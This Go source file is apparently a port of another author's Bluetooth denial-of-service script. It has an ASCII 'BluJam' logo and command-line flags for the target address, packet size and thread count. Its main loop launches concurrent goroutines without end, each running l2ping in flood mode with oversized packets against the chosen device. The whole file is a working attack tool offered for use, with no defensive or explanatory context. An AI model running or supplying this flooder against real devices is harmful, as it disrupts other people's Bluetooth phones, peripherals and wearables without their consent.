/*
go version of crypt0boy's
Bluetooth DOos script

Anoop S
2023

*/


package main

import(
	"os/exec"
	"os"
	"strconv"
	"fmt"
	"flag"

)


func Ping(targetAddr string, packetSize int64){
	cmd := exec.Command("l2ping", "-i",  "hci0", "-s", strconv.FormatInt(packetSize, 10), "-f", targetAddr)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Run()

}


func printLogo(){
	logo :=` ____  _           _                 
| __ )| |_   _    | | __ _ _ __ ___  
|  _ \| | | | |_  | |/ _' | '_ ' _ \ 
| |_) | | |_| | |_| | (_| | | | | | |
|____/|_|\__,_|\___/ \__,_|_| |_| |_|
                                    
`
	fmt.Println(logo)
}

func main(){
	targetAddr := flag.String("d", "", "device address")
	packetSize := flag.Int64("p", 600, "packet size")
	threads := flag.Int("t", 10, "threads")

	flag.Parse()
	flag.Usage = func(){
		fmt.Printf("%s -d device_id [-p packet_size] [-t threads]\n", os.Args[0])
		flag.PrintDefaults()
	}

	if len(*targetAddr) == 0{
		flag.Usage()
		os.Exit(1)
	}

	printLogo()

	ch := make(chan struct{}, *threads)

	for{
		ch<-struct{}{}
		go func(){
			Ping(*targetAddr, *packetSize)
			<-ch
		}()
	}

}

